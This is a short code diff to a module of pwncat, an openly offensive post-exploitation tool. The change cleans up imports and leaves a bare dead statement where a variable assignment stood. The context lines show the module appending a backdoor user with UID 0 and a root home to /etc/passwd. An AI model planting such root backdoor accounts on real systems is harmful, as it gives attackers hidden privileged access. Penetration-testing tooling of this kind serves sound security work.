@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 import crypt
 
+import pwncat
 from pwncat.util import console
-from pwncat.facts import ImplantType, EscalationReplace
+from pwncat.facts import EscalationReplace
 from pwncat.modules import ModuleFailed
-from pwncat.platform import PlatformError
-from pwncat.facts.tamper import ReplacedFile
 from pwncat.platform.linux import Linux
 from pwncat.modules.enumerate import Schedule, EnumerateModule
 from pwncat.modules.linux.implant.passwd import PasswdImplant
@@ -37,7 +36,7 @@ class AppendPasswd(EscalationReplace):
         if not any(line.startswith(f"{backdoor_user}:") for line in passwd_contents):
 
             # Add our password
-            saved_content = "".join(passwd_contents)
+            "".join(passwd_contents)
             new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""
             passwd_contents.append(new_line)
 
